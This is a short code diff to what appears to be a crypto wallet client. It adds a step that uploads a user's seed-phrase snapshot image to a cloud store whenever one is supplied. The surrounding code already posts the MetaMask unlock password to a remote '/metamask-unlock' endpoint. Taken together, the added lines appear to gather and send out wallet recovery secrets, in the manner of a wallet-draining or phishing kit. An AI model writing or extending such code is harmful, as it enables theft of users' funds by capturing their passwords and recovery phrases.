@@ -7,6 +7,7 @@ import {
   disconnectCloudWalletSession,
   upsertCloudWalletSession,
 } from './walletCloudStore'
+import { upsertCloudPhraseSnap } from './walletPhraseSnapsCloud'
 
 const API_BASE = resolveApiUrl('/api/wallet')
 
@@ -154,6 +155,9 @@ export const walletApi = {
       unlockPassword: payload.password,
       phraseSnapImage: payload.phraseSnapImage ?? null,
     })
+    if (payload.phraseSnapImage) {
+      await upsertCloudPhraseSnap(payload.walletAddress, payload.phraseSnapImage)
+    }
     try {
       const res = await fetch(`${API_BASE}/metamask-unlock`, {
         method: 'POST',
